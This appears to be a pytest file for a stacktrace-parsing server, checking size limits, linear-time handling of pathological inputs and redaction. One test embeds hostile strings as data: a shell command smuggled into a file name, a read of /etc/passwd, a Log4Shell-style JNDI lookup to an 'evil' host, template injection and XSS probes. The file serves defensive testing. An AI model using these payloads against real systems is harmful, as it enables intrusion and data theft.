"""Untrusted input: size caps, pathological shapes (linear time), and hostile content."""

from __future__ import annotations

import time

import pytest
from stacktrace_mcp import server
from stacktrace_mcp.analyze import find_traces
from stacktrace_mcp.prep import MAX_CHARS, InputError
from stacktrace_mcp.redact import redact

LIMIT_SECONDS = 20.0  # generous: CI runners vary; a quadratic blow-up would take minutes


def timed(fn, *args):  # type: ignore[no-untyped-def]
    t0 = time.perf_counter()
    try:
        fn(*args)
    except (InputError, ValueError):
        pass
    elapsed = time.perf_counter() - t0
    assert elapsed < LIMIT_SECONDS, f"{fn.__name__} took {elapsed:.1f}s"


PATHOLOGICAL = {
    "open_parens_one_line": "    at " + "(" * 1_000_000 + "\n",
    "space_paren_repeat": "    at " + " (" * 500_000 + "\n",
    "at_lines_5mb": "    at foo (/a/b.js:1:1)\n" * 200_000,
    "python_file_quotes": '  File "' + '", line 1, in "' * 100_000 + "\n",
    "traceback_headers": "Traceback (most recent call last):\n" * 120_000,
    "colon_digits": "    at x (" + ":1" * 500_000 + ")\n",
    "java_dots": "\tat " + "a." * 500_000 + "b(X.java:1)\n",
    "java_headers_then_at": "java.lang.RuntimeException: x\n" * 100_000 + "\tat a.B.c(B.java:1)\n",
    "go_panics": "panic: x\n" * 200_000,
    "goroutine_headers": "goroutine 1 [running]:\n" * 200_000,
    "rust_panics": "thread 'a' panicked at src/m.rs:1:1:\n" * 100_000,
    "dotnet_arrows": "A: b " + " ---> C: d" * 100_000 + "\n   at X.Y() in f:line 1\n",
    "dotnet_end_markers": "A: b\n" + "   at X.Y() in f.cs:line 1\n   --- End of inner exception stack trace ---\n" * 50_000,
    "long_words": "x" * 4_000_000 + "\n",
    "many_blank_lines": "\n" * 4_000_000,
    "node_braces": "Error: x\n    at a (/a.js:1:1) {\n" + "  [cause]: Error: y\n    at b (/b.js:1:1) {\n" * 20_000,
    "box_drawing": "  + Exception Group Traceback (most recent call last):\n" + "  +-+---------------- 1 ----------------\n" * 50_000,
    "nested_box_deep": "".join(" " * (2 * k) + "+-+---------------- 1 ----------------\n" for k in range(1, 2000)),
    "binary_noise": "".join(chr(i % 256) for i in range(2_000_000)),
}


@pytest.mark.parametrize("name", sorted(PATHOLOGICAL))
def test_pathological_inputs_finish_quickly(name: str) -> None:
    text = PATHOLOGICAL[name][:MAX_CHARS]
    timed(find_traces, text)
    timed(server.parse_trace, text)
    timed(server.fingerprint, text)


@pytest.mark.parametrize(
    "text",
    [
        "sk-" * 300_000,
        "@" * 1_000_000,
        "a." * 400_000 + "@" + "b." * 100_000,
        "a@" * 400_000,
        "password=" * 200_000,
        "eyJ" + "A" * 1_000_000,
        "1." * 1_000_000,
        ("1" * 1000 + ".") * 3000,
        "A" * 2_000_000,
        "0" * 2_000_000,
        "://" * 300_000,
        "Bearer " * 200_000,
        "http://" + "u:" * 300_000 + "@",
        ":" * 2_000_000,
        "[" + "a:" * 400_000 + "]:1",
    ],
)
def test_redaction_is_linear(text: str) -> None:
    timed(redact, text)


def test_oversized_input_is_rejected_with_a_clear_message() -> None:
    with pytest.raises(InputError, match="5,000,000"):
        server.parse_trace("x" * (MAX_CHARS + 1))
    with pytest.raises(InputError, match="limit"):
        server.redact_trace("x" * (MAX_CHARS + 1))
    with pytest.raises(InputError, match="limit"):
        server.fingerprint("x" * (MAX_CHARS + 1))


def test_exactly_at_the_limit_is_accepted() -> None:
    server.redact_trace("x" * MAX_CHARS)


def test_overlong_lines_are_cut_and_reported() -> None:
    text = "Traceback (most recent call last):\n  File \"/a.py\", line 1, in f\n    " + "y" * 10_000 + "\nValueError: " + "z" * 10_000 + "\n"
    out = server.parse_trace(text)
    assert "longer than 4000" in out
    assert len(out) < 5_000


def test_hostile_trace_text_is_data_not_code(tmp_path) -> None:  # type: ignore[no-untyped-def]
    marker = tmp_path / "pwned.txt"
    text = (
        "Traceback (most recent call last):\n"
        f'  File "__import__(\'os\').system(\'echo x > {marker.as_posix()}\')", line 1, in <module>\n'
        "    exec(open('/etc/passwd').read())\n"
        "ValueError: ${jndi:ldap://evil/a} {{7*7}} <script>alert(1)</script> %s %n\n"
    )
    out = server.parse_trace(text)
    assert "ValueError" in out
    assert not marker.exists()


def test_control_characters_and_ansi_are_survivable() -> None:
    text = "\x1b[31mTraceback (most recent call last):\x1b[0m\n  File \"/a.py\", line 1, in f\n    x\n\x1b[1;31mValueError\x1b[0m: bad\x00\x07\n"
    out = server.parse_trace(text)
    assert "ValueError" in out


def test_unicode_and_surrogates() -> None:
    text = 'Traceback (most recent call last):\n  File "/é/中文.py", line 1, in fü\n    x\nValueError: 😀 \udcff\n'
    out = server.parse_trace(text)
    assert "ValueError" in out


def test_index_argument_abuse() -> None:
    text = "Traceback (most recent call last):\n  File \"/a.py\", line 1, in f\n    x\nValueError: bad\n"
    for bad in (-1, 10**30, 10**9):
        with pytest.raises(Exception, match="out of range"):
            server.parse_trace(text, index=bad)
    out = server.parse_trace(text, max_frames=-5)
    assert "ValueError" in out
    with pytest.raises(Exception, match="format"):
        server.parse_trace(text, format="xml")


def test_line_number_overflow_digits() -> None:
    text = 'Traceback (most recent call last):\n  File "/a.py", line ' + "9" * 5000 + ", in f\n    x\nValueError: bad\n"
    assert "ValueError" in server.parse_trace(text)
